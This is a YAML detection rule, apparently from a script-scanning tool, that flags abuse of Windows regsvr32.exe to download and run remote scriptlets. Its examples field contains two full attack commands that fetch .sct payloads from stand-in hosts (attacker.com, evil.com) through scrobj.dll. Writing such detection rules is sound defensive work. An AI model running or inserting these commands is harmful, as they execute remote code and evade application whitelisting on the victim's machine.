# PowerShell Pattern: Regsvr32 LOLBin Abuse
# Detects regsvr32.exe usage for code execution

id: PS-023
name: Regsvr32 LOLBin Abuse
description: |
  Detects abuse of regsvr32.exe as a Living Off The Land Binary for executing
  malicious scripts and bypassing application whitelisting. Regsvr32 can download
  and execute scriptlets (.sct files) from remote servers using the /i flag.
languages:
  - powershell
detection_type: regex
detection_logic: '(?i)regsvr32(?:\.exe)?.*(?:/i:|/u|/s|/n).*(?:http://|https://|\.sct|scrobj\.dll)'
severity: High
mitre_technique: T1218.010
confidence: 0.90
category: defense_evasion
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-01-19"
  references:
    - "https://attack.mitre.org/techniques/T1218/010/"
    - "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"
  tags:
    - lolbin
    - regsvr32
    - code-execution
    - defense-evasion
  examples:
    - "regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"
    - "regsvr32 /s /i:https://evil.com/malware.sct scrobj.dll"